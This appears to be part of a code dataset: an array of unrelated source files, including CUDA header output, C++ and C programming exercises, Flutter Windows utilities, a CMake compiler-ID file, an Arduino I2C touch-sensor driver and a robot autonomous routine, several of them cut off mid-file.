\"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 154\nstruct __attribute((aligned(4))) ushort2 { \n# 156\nunsigned short x, y; \n# 157\n}; \n#endif\n# 159 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 159\nstruct short3 { \n# 161\nshort x, y, z; \n# 162\n}; \n#endif\n# 164 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 164\nstruct ushort3 { \n# 166\nunsigned short x, y, z; \n# 167\n}; \n#endif\n# 169 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 169\nstruct __attribute((aligned(8))) short4 { short x; short y; short z; short w; }; \n#endif\n# 170 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 170\nstruct __attribute((aligned(8))) ushort4 { unsigned short x; unsigned short y; unsigned short z; unsigned short w; }; \n#endif\n# 172 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 172\nstruct int1 { \n# 174\nint x; \n# 175\n}; \n#endif\n# 177 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 177\nstruct uint1 { \n# 179\nunsigned x; \n# 180\n}; \n#endif\n# 182 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 182\nstruct __attribute((aligned(8))) int2 { int x; int y; }; \n#endif\n# 183 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 183\nstruct __attribute((aligned(8))) uint2 { unsigned x; unsigned y; }; \n#endif\n# 185 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 185\nstruct int3 { \n# 187\nint x, y, z; \n# 188\n}; \n#endif\n# 190 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 190\nstruct uint3 { \n# 192\nunsigned x, y, z; \n# 193\n}; \n#endif\n# 195 \"/",
    "/*create a class Student \nhaving data members int rollNo, int age, char sex, name(char*),\nmap<string, int> containing marks of subjects\nEnglish, Maths, Science, History, Geography\ncreate 10 students and add it to a vector.\n \nsort the vector according to name.*/\n\n#include <iostream>\n#include <vector>\n#include <map>\n#include <cstring>\n#include <algorithm>\n\nusing namespace std;\n\nclass Student {\nprivate:\n    int rollNo;\n    int age;\n    char sex;\n    char* name;\n    \n\npublic:\n    \n    map<string, int> marks;\n// Constructor\n    Student(int RollNo, int Age, char Sex, const char* Name) : rollNo(RollNo), age(Age), sex(Sex) {\n        name = new char[strlen(Name) + 1];\n        strcpy(name, Name);\n        // Initialize marks with default values\n        marks[\"English\"] = 0;\n        marks[\"Maths\"] = 0;\n        marks[\"Science\"] = 0;\n        marks[\"History\"] = 0;\n        marks[\"Geography\"] = 0;\n    }\n\n    // Destructor\n    ~Student() {\n        delete[] name;\n    }\n\n        void setMark(const string& subject, int mark) {\n        marks[subject] = mark;\n    }\n\n    \n    const char* getName() const {\n        return name;\n    }\n\n    \n    void display() const {\n        cout << \"Roll No: \" << rollNo << endl;\n        cout << \"Name: \" << name << endl;\n        cout << \"Age: \" << age << endl;\n        cout << \"Sex: \" << sex << endl;\n        cout << \"Marks:\" << endl;\n        for (const auto& pair : marks) {\n            cout << pair.first << \": \" << pair.second << endl;\n        }\n        cout << endl;\n    }\n};\n\nbool compareByName(const Student& s1, const Student& s2) {\n    return strcmp(s1.getName(), s2.getName()) < 0;\n}\n\nint main() {\n    vector<Student> students;\n\n    for (int i = 0; i < 10; ++i) {\n        int rollNo, age;\n        char sex, name[50];\n        cout << \"Enter details for Student \" << i + 1 << \":\" << endl;\n        cout << \"Roll No: \";\n        cin >> rollNo;\n        cout << \"Name: \";\n        cin >> name;\n        cout << \"Age: \";\n        cin >> age;\n        cout << \"Sex (M/F): \";\n        cin >> sex;\n\n        students.push_back(Student(rollNo, age, sex, name));\n\n        for (auto& student : students.back().marks) {\n            string subject;\n            int mark;\n            cout << \"Enter marks for \" << student.first << \": \";\n            cin >> mark;\n            student.second = mark;\n        }\n    }\n\n    sort(students.begin(), students.end(), compareByName);\n\n    cout << \"Student information after sorting by name:\" << endl;\n    for (const auto& student : students) {\n        student.display();\n    }\n\n    return 0;\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\n#include <queue>\n#include <vector>\n#include <algorithm>\nusing namespace std;\n\nstruct Node{\n\tint y;\n\tint x;\n};\n\nstruct preTree {\t// \ub098\ubb34 \ubc88\uc2dd\ud560\ub54c \ud544\uc694\ud55c \uad6c\uc870\uccb4\n\tint y;\n\tint x;\n\tint growNum;\n};\n\nbool compare(Node a, Node b) {\n\tif (a.y == b.y) {\n\t\treturn a.x < b.x;\n\t}\n\treturn a.y < b.y;\n}\n\nint N, M, K, C, answer;\nint treeMAP[21][21];\nint medMAP[21][21];\nint dy[4] = { -1, 1, 0, 0 };  int dx[4] = { 0, 0, -1, 1 };\t\t// \ub098\ubb34\uc6a9\nint ddy[4] = { -1, -1, 1, 1 }; int ddx[4] = { -1, 1, -1, 1 };\t// \uc81c\ucd08\uc81c\uc6a9\nqueue <Node> treeList;\n\n\nvoid input() {\n\tcin >> N >> M >> K >> C;\n\tfor (int i = 0; i < N; i++){\n\t\tfor (int j = 0; j < N; j++){\n\t\t\tcin >> treeMAP[i][j];\n\t\t\tif (treeMAP[i][j] > 0)\n\t\t\t\ttreeList.push({ i, j });\n\t\t}\n\t}\n}\n\n// \ub098\ubb34 \uc131\uc7a5 \ud568\uc218\nvoid growTree(int curYear){\n\n\tint curTreeNum = treeList.size();\n\tfor (int  i = 0; i < curTreeNum; i++){\n\t\tNode curTree = treeList.front();\n\t\ttreeList.pop();\n\n\t\tint nearNum = 0;\n\t\tfor (int j = 0; j < 4; j++){\n\t\t\tint ny = curTree.y + dy[j];\n\t\t\tint nx = curTree.x + dx[j];\n\n\t\t\tif (ny < 0 || nx < 0 || ny >= N || nx >= N)\n\t\t\t\tcontinue;\n\t\t\tif (treeMAP[ny][nx] > 0)\n\t\t\t\tnearNum++;\n\t\t}\n\t\ttreeMAP[curTree.y][curTree.x] += nearNum;\n\t\ttreeList.push(curTree);\n\t}\n}\n\n// \ub098\ubb34 \ubc88\uc2dd \ud568\uc218\nvoid makeTree(int curYear) {\n\t\n\t// \ubc88\uc2dd\ud574\uc11c \ud0dc\uc5b4\ub0a0 \uc608\ube44 \ub098\ubb34 \ub9ac\uc2a4\ud2b8\uc5d0 \ub2f4\ub294\ub2e4.\n\tvector <preTree> preTrees;\t\t\t\t\t\t\t// \ubc88\uc2dd\ud574\uc11c \ud0dc\uc5b4\ub098\ub294 \uc608\ube44 \ub098\ubb34\ub4e4\n\tint curTreeNum = treeList.size();\n\tfor (int i = 0; i < curTreeNum; i++) {\n\t\tNode curTree = treeList.front();\n\t\ttreeList.pop();\n\n\t\tvector <Node> posPosition;\t// \ud55c \ub098\ubb34\ub2f9 \uac00\ub2a5\ud55c \uc704\uce58 \ub2f4\ub294 \ud568\uc218\n\t\tfor (int j = 0; j < 4; j++) {\n\t\t\tint ny = curTree.y + dy[j];\n\t\t\tint nx = curTree.x + dx[j];\n\n\t\t\tif (ny < 0 || nx < 0 || ny >= N || nx >= N)\n\t\t\t\tcontinue;\n\t\t\tif (treeMAP[ny][nx] == -1 || treeMAP[ny][nx] > 0)\n\t\t\t\tcontinue;\n\t\t\tif (medMAP[ny][nx] >= curYear)\t// \uc81c\ucd08\uc81c\uac00 \ub0a8\uc544\uc788\ub294 \uc704\uce58\uc600\ub2e4\uba74\n\t\t\t\tcontinue;\n\t\t\tposPosition.push_back({ ny, nx });\n\t\t}\n\n\t\tif (posPosition.size() == 0) {\t\t\n\t\t\tcontinue;\n\t\t}\t\n\t\telse {\t\t\t// \uc608\ube44 \ub098\ubb34 \ub9ac\uc2a4\ud2b8\uc5d0 \ub2f4\ub294\ub2e4.\n\t\t\tint makeNum = treeMAP[curTree.y][curTree.x] / posPosition.size();\n\t\t\tfor (Node newPos : posPosition) {\n\t\t\t\tpreTrees.push_back({newPos.y, newPos.x, makeNum});\n\t\t\t}\n\t\t}\n\t}\n\n\t// \uc608\ube44 \ub098\ubb34\ub4e4 \ubfcc\ub9ac\uae30\n\tfor (preTree tree : preTrees){\n\t\ttreeMAP[tree.y][tree.x] += tree.growNum;\n\t}\n}\n\n// \ud574\ub2f9 \uc704\uce58\uc5d0\uc11c \uc81c\ucd08\uc81c \ubfcc\ub9b4\ub54c \ucd5c\ub300 \ub098\ubb34 kill \uac1c\uc218 \uad6c\ud558\uae30\nint findKillNum(int startY, int startX) {\n\n\tint sum = treeMAP[startY][startX];\n\tfor (int i = 0; i < 4; i++){\n\t\tfor (int j = 1; j <= K; j++){\n\t\t\tint ny = startY + ddy[i] * j;\n\t\t\tint nx = startX + ddx[i] * j;\n\n\t\t\tif (ny < 0 || nx < 0 || ny >= N || nx >= N)\n\t\t\t\tbreak;\n\t\t\tif (treeMAP[ny][nx] <= 0)\n\t\t\t\tbreak;\n\t\t\tsum += treeMAP[ny][nx];\n\t\t}\n\t}\n\treturn sum;\n}\n\n// \ubfcc\ub9b4 \uc81c\ucd08\uc81c \uc704\uce58 \uad6c\ud558\uace0 \ubfcc\ub9ac\uace0 \uc0b4\uc544\uc788\ub294 \ub098\ubb34\ub294 \ub123\ub294 \ud568\uc218\nvoid killTree(int curYear) {\n\t\n\t// max \uac12\uc744 \ucc3e\ub294\ub2e4\n\tint maxMAP[21][21] = { 0, };\n\tint maxKill = 0;\n\tfor (int i = 0; i < N; i++){\n\t\tfor (int j = 0; j < N; j++){\n\t\t\tif (treeMAP[i][j] > 0)\n\t\t\t\tmaxMAP[i][j] = findKillNum(i, j);\n\t\t\t\tmaxKill = max(maxKill, maxMAP[i][j]);\n\t\t}\n\t}\n\n\t// max\uc778 \uc704\uce58 \ub123\ub294\ub2e4.\n\tvector <Node> medList;\n\tfor (int i = 0; i < N; i++){\n\t\tfor (int j = 0; j < N; j++){\n\t\t\tif (maxMAP[i][j] == maxKill)\n\t\t\t\tmedList.push_back({ i, j });\n\t\t}\n\t}\n\n\t// \uc704\uce58 \ucc3e\uace0 sort\ud55c\ub2e4\n\tif (medList.size() == 0)\n\t\treturn;\n\tsort(medList.begin(), medList.end(), compare);\n\tNode targetPos = medList[0];\n\n\t// \uc815\ub2f5 \uc5c5\ub370\uc774\ud2b8\ud558\uace0 \uc81c\ucd08\uc81c \ubfcc\ub9ac\uae30 \n\tanswer += maxKill;\n\ttreeMAP[targetPos.y][targetPos.x] = 0;\n\tmedMAP[targetPos.y][targetPos.x] = curYear + C;\n\tfor (int i = 0; i < 4; i++) {\n\t\tfor (int j = 1; j <= K; j++) {\n\t\t\tint ny = targetPos.y + ddy[i] * j;\n\t\t\tint nx = targetPos.x + ddx[i] * j;\n\n\t\t\tif (ny < 0 || nx < 0 || ny >= N || nx >= N)\n\t\t\t\tbreak;\n\t\t\tif (treeMAP[ny][nx] <= 0) {\n\t\t\t\tmedMAP[ny][nx] = curYear + C;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tmedMAP[ny][nx] = curYear +  C;\n\t\t\ttreeMAP[ny][nx] = 0;\t\n\t\t}\n\t}\n\n\t// \ub2e4\uc74c \ub144\ub3c4\ub97c \uc704\ud574 \uc0b4\uc544\uc788\ub294 \ub098\ubb34\ub4e4 \ub9ac\uc2a4\ud2b8\uc5d0 \ub2f4\uae30\n\tfor (int i = 0; i < N; i++){\n\t\tfor (int j = 0; j < N; j++){\n\t\t\tif (treeMAP[i][j] > 0)\n\t\t\t\ttreeList.push({i, j});\n\t\t}\n\t}\n}\n\nvoid solve() {\n\tfor (int year = 1; year <= M; year++){\n\n\t\tgrowTree(year);\n\t\tmakeTree(year);\n\t\tkillTree(year);\n\t\tint de = -1;\n\t}\n}\n\nint main() {\n\t//freopen(\"sample_input.txt\", \"r\", stdin);\n\tinput();\n\tsolve();\n\n\tcout << answer;\n\n\treturn 0;\n}",
    "#include <stdio.h>\r\n\r\nvoid NhapMang(int a[][2], int N, int tongHang[]) {\r\n    for (int i = 0; i < N; i++) {\r\n        int sum = 0;\r\n        for (int j = 0; j < 2; j++) {\r\n            scanf(\"%d\", &a[i][j]);\r\n            sum += a[i][j];\r\n        } tongHang[i] = sum;\r\n    }\r\n}\r\n\r\nint Max2(int a[][2], int N);\r\nint MaxSkill(int tongHang[], int N, int maxCot2, int M);\r\n\r\nint main() {\r\n    int N, M;\r\n    scanf(\"%d%d\", &N, &M);\r\n\r\n    int skill[N][2], tongHang[N];\r\n    NhapMang(skill, N, tongHang);\r\n\r\n    int maxCot2 = Max2(skill, N);\r\n    int maxSkill = MaxSkill(tongHang, N, maxCot2, M);\r\n    printf(\"So SM Max = %d\\n\", maxSkill);\r\n\r\n    return 0;\r\n}\r\n\r\nint Max2(int a[][2], int N) {\r\n    int maxCot2 = a[0][1];\r\n    for (int i = 1; i < N; i++) {\r\n        if (a[i][1] > maxCot2) {\r\n            maxCot2 = a[i][1];\r\n        }\r\n    }\r\n    return maxCot2;\r\n}\r\n\r\nint MaxSkill(int tongHang[], int N, int maxCot2, int M) {\r\n    int sum = 0, dem = 0;\r\n    for (int i = 0; i < N; i++) {\r\n        if (tongHang[i] > maxCot2) {\r\n            sum += tongHang[i];\r\n            dem++;\r\n        }\r\n    }\r\n    sum += (M - dem) * maxCot2;\r\n    return sum;\r\n}",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "/* ========================================\n *\n *\ti2cdevice.cpp\n *\t\tdescription: TouchMidi I2C Device Driver\n *\n *\tCopyright(c)2018- Masahiko Hasebe at Kigakudoh\n *  This software is released under the MIT License, see LICENSE.txt\n *\n * ========================================\n*/\n#include\t\"Arduino.h\"\n#include  <Wire.h>\n#include  <avr/pgmspace.h>\n\n#include  \"constants.h\"\n#include\t\"i2cdevice.h\"\n\n\n//---------------------------------------------------------\n//    Variables\n//---------------------------------------------------------\nint   i2cErrCode;\n\n//---------------------------------------------------------\n//\t\tInitialize I2C Device\n//---------------------------------------------------------\nvoid wireBegin( void )\n{\n  Wire.setClock(400000);\n  Wire.setSDA(20);\n  Wire.setSCL(21);\n\tWire.begin();\n}\n//---------------------------------------------------------\n//\t\tWrite I2C Device\n//    Err Code\n//      0:success\n//      1:data too long to fit in transmit buffer\n//      2:received NACK on transmit of address\n//      3:received NACK on transmit of data\n//      4:other error\n//---------------------------------------------------------\nint write_i2cDevice( unsigned char adrs, unsigned char* buf, int count )\n{\n\tWire.beginTransmission(adrs);\n  Wire.write(buf,count);\n\treturn Wire.endTransmission();\n}\n//---------------------------------------------------------\n//\t\tRead 1byte I2C Device\n//---------------------------------------------------------\nint read1byte_i2cDevice( unsigned char adrs, unsigned char* wrBuf, unsigned char* rdBuf, int wrCount )\n{\n\tunsigned char err;\n\n\tWire.beginTransmission(adrs);\n  Wire.write(wrBuf,wrCount);\n\terr = Wire.endTransmission(false);\n\tif ( err != 0 ){ return err; }\n\n\terr = Wire.requestFrom(adrs,(uint8_t)1,(uint8_t)0);\n\twhile(Wire.available()) {\n\t\t*rdBuf = Wire.read();\n\t}\n\n\t//err = Wire.endTransmission(true);\n\t//return err;\n  return 0;\n}\n//---------------------------------------------------------\n//\t\tRead N byte I2C Device\n//---------------------------------------------------------\n//\u9001\u4fe1\u7d50\u679c (byte) \n//0: \u6210\u529f \n//1: \u9001\u308d\u3046\u3068\u3057\u305f\u30c7\u30fc\u30bf\u304c\u9001\u4fe1\u30d0\u30c3\u30d5\u30a1\u306e\u30b5\u30a4\u30ba\u3092\u8d85\u3048\u305f \n//2: \u30b9\u30ec\u30fc\u30d6\u30fb\u30a2\u30c9\u30ec\u30b9\u3092\u9001\u4fe1\u3057\u3001NACK\u3092\u53d7\u4fe1\u3057\u305f \n//3: \u30c7\u30fc\u30bf\u30fb\u30d0\u30a4\u30c8\u3092\u9001\u4fe1\u3057\u3001NACK\u3092\u53d7\u4fe1\u3057\u305f \n//4: \u305d\u306e\u4ed6\u306e\u30a8\u30e9\u30fc \n//\nint read_nbyte_i2cDevice( unsigned char adrs, unsigned char* wrBuf, unsigned char* rdBuf, int wrCount, int rdCount )\n{\n\tunsigned char err;\n\n\tWire.beginTransmission(adrs);\n  Wire.write(wrBuf,wrCount);\n\terr = Wire.endTransmission(false);\n\tif ( err != 0 ){ return err; }\n\n\terr = Wire.requestFrom(adrs,static_cast<uint8_t>(rdCount),(uint8_t)0);\n\tint rdAv = 0;\n\twhile((rdAv = Wire.available()) != 0) {\n\t\t*(rdBuf+rdCount-rdAv) = Wire.read();\n\t}\n\n\t//err = Wire.endTransmission(true);\n\t//return err;\n\n\treturn 0;\n}\n//---------------------------------------------------------\n//    Read Only N byte I2C Device\n//    Err Code\n//      0:success\n//      1:data too long to fit in transmit buffer\n//      2:received NACK on transmit of address\n//      3:received NACK on transmit of data\n//      4:other error\n//---------------------------------------------------------\nint read_only_nbyte_i2cDevice( unsigned char adrs, unsigned char* rdBuf, int rdCount )\n{\n  unsigned char err;\n\n  err = Wire.requestFrom(adrs,static_cast<uint8_t>(rdCount),static_cast<uint8_t>(false));\n  int rdAv = Wire.available();\n  while( rdAv ) {\n    *(rdBuf+rdCount-rdAv) = Wire.read();\n    rdAv--;\n  }\n\n  err = Wire.endTransmission(true);\n  return err;\n}\n\n\n#ifdef USE_CY8CMBR3110\n//-------------------------------------------------------------------------\n//\t\t\tCap Sense CY8CMBR3110 (Touch Sencer : I2c Device)\n//-------------------------------------------------------------------------\n#define   MAX_DEVICE_MBR3110    MAX_KAMABOKO_NUM\n#define\t\tCONFIG_DATA_OFFSET\t  0\n#define\t\tCONFIG_DATA_SZ\t\t\t  128\n\n#define\t\tSENSOR_EN\t\t          0x00\t//\tRegister Address\n#define\t\tSENSITIVITY0\t\t\t    0x08\t//\tRegister Address\n#define\t\tSENSITIVITY1\t\t\t    0x09\t//\tRegister Address\n#define\t\tSENSITIVITY2\t\t\t    0x0a\t//\tRegister Address\n#define\t\tI2C_ADDR\t\t\t\t      0x51\t//\tRegister Address\n#define\t\tCONFIG_CRC\t\t\t\t    0x7e\t//\tRegister Address\n\n#define\t\tCTRL_CMD\t\t\t\t      0x86\t//\tRegister Address\n#define\t\tPOWER_ON_AND_FINISHED\t0x00\n#define\t\tSAVE_CHECK_CRC\t\t    0x02\n#define\t\tDEVICE_RESET\t\t\t    0xff\n\n#define\t\tCTRL_CMD_ERR\t\t\t    0x89\t//\tRegister Address\n\n#define\t\tFAMILY_ID_ADRS\t\t\t  0x8f\t//\tRegister Address\n#define\t\tFAMILY_ID\t\t\t\t      0x9a\n#define\t\tDEVICE_ID_ADRS\t\t\t  0x90\t//\tRegister Address\n#define\t\tDEVICE_ID_LOW\t\t\t    0x02\n#define\t\tDEVICE_ID_HIGH\t\t\t  0x0a\n\n#define\t\tTOTAL_WORKING_SNS\t\t  0x97\t//\tRegister Address\n#define\t\tSNS_VDD_SHORT\t\t\t    0x9a\t//\tRegister Address\n#define\t\tSNS_GND_SHORT\t\t\t    0x9c\t//\tRegister Address\n#define\t\tBUTTON_STAT\t\t\t\t    0xaa\t//\tRegister Address\n\nstatic const unsigned char CAP_SENSE_ADDRESS_ORG = 0x37;  //  Factory-Set\nstatic const unsigned char CAP_SENSE_ADDRESS_1 = 0x38;\nstatic const unsigned char CAP_SENSE_ADDRESS_2 = 0x39;\nstatic const unsigned char CAP_SENSE_ADDRESS_3 = 0x3a;\nstatic const unsigned char CAP_SENSE_ADDRESS_4 = 0x3b;\nstatic const unsigned char CAP_SE",
    "#include \"rev/rev.hh\"\n#include \"path/Path.h\"\n#include \"globals.h\"\n#include \"api.h\"\n\nvoid comp_auto(std::shared_ptr<rev::TwoRotationInertialOdometry> odom, std::shared_ptr<rev::Reckless> reckless,\n               std::shared_ptr<rev::CampbellTurn> turn, const IntakeSystem &intake)\n{\n    Path path;\n\n    //path.add_turn(MyTurn(-45_deg,500_ms, 0.7));\n    //path.add_intake_control(OUT);\n    //path.add_delay(300);\n    //path.add_intake_control(REST);\n    path.add_straight(Straight({3_in, 0_in, 0_deg}, 0_in, MOTOR_SPEED::MID, false, 500_ms));\n    //path.add_wing_control(Wing(OPEN, BACK_RIGHT));\n    path.add_turn(MyTurn(-90_deg, 400_ms, 0.7));\n    path.add_wing_control(Wing(OPEN, BACK_LEFT));\n    path.add_delay(100);\n    //path.add_straight(Straight({10_in, -10_in, 0_deg}, 0_in, MOTOR_SPEED::MID, true, 1000_ms));\n\n    //path.add_straight(Straight({  10_in, -21_in, 0_deg}, 0_in, MOTOR_SPEED::MID,false,1000_ms));\n    path.add_turn(MyTurn(0_deg));\n    path.add_wing_control(Wing(CLOSE, BACK_LEFT));\n    path.add_delay(100);\n    //path.add_straight(Straight({  16_in,   0_in, 0_deg}, 0_in, MOTOR_SPEED::MID,false,1000_ms));\n\n\n    // get the bottom left ball\n    path.add_straight(Straight({38_in, -1_in, 0_deg}, 0_in, MOTOR_SPEED::MID, true, 400_ms));\n    path.add_intake_control(IN);\n    path.add_straight(Straight({38_in, -1_in, 0_deg}, 0_in, MOTOR_SPEED::MID, false, 1000_ms));\n    path.add_intake_control(IN_WITH_SENSE);\n\n    // drop if off for Zeus to grab\n    path.add_turn(MyTurn(135_deg, 700_ms));\n    path.add_straight(Straight({25_in, 8_in, 0_deg}, 0_in, MOTOR_SPEED::MID, false, 800_ms));\n   // path.add_straight(Straight({33_in, 25_in, 0_deg}, 0_in, MOTOR_SPEED::MID, false, 1300_ms));\n    path.add_intake_control(OUT_SLOW);\n    path.add_delay(600);\n    path.add_intake_control(REST);\n    